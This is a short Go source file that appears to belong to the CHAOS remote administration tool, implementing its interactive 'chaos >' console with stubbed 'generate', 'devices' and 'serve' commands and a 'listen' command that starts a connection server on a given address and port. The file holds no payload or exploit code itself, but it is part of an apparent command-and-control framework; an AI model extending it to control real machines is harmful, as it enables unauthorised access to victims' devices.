package app

import (
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/tiagorlampert/CHAOS/internal/handler"
	"github.com/tiagorlampert/CHAOS/internal/handler/server"
	"github.com/tiagorlampert/CHAOS/internal/ui/completer"
	c "github.com/tiagorlampert/CHAOS/pkg/color"
	"github.com/tiagorlampert/CHAOS/pkg/system"
	"github.com/tiagorlampert/CHAOS/pkg/util"
	"strings"
)

type appHandler struct{}

func NewAppHandler() handler.App {
	return &appHandler{}
}

func (c appHandler) Handle() {
	p := prompt.New(
		executor,
		completer.HostCompleter,
		prompt.OptionPrefix("chaos > "),
		prompt.OptionPrefixTextColor(prompt.White),
	)
	p.Run()
}

func executor(input string) {
	values := strings.Fields(input)
	for _, v := range values {
		switch v {
		case "generate":
		case "listen":
			serverHandler(values)
			return
		case "devices":
		case "serve":
		case "exit":
			system.QuitApp()
		default:
			fmt.Println(c.Red, " [!] Invalid parameter!")
			util.Sleep(3)
			system.ClearScreen()
			return
		}
	}
}

func serverHandler(v []string) {
	if !util.Contains(v, "address=") {
		fmt.Println(c.Yellow, "[!] You should specify a address!")
		return
	}
	if !util.Contains(v, "port=") {
		fmt.Println(c.Yellow, "[!] You should specify a port!")
		return
	}

	address := util.SplitAfterIndex(util.Find(v, "address="), '=')
	port := util.SplitAfterIndex(util.Find(v, "port="), '=')

	handler := server.NewServerHandler(address, port)
	handler.HandleConnections()
}
